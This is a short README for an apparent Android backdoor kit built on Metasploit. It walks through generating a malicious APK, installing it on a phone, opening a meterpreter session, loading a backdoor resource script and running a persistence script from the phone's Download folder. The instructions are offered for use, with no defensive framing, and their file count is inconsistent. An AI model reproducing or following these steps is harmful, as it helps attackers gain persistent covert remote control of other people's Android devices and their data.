#######################################################
## Created by Aaron Vigal. http://www.aaronvigal.com ##
#######################################################
Setup:
 > There should be 6 files inside of a folder named Metasploit on your Desktop
 > The 4 required files are:
    * alwaysOpen.sh
    * exploit
    * connect
    * android.rb
    * backdoor.rb

Step 1.
 > Navigate to the Metasploit folder on the Desktop

Step 2.
 > Open up a terminal and run "./exploit" if you haven't made the APK yet
 > Run "./connect" if you have already made the APK
   Hint: If the file doessn't have the needed permissions, run chmod +x android

Step 3. (If not already done)
 > Install and run MainActivity on your android device

Step 4.
 > Once a meterpreter session opens, run the following command:
   "resource /root/Desktop/Metasploit/Android/backdoor.rb"

Step 5.
 > Type the following 3 commands:
	1. cd /
	2. cd /sdcard/Download
	3. sh alwaysOpen.sh

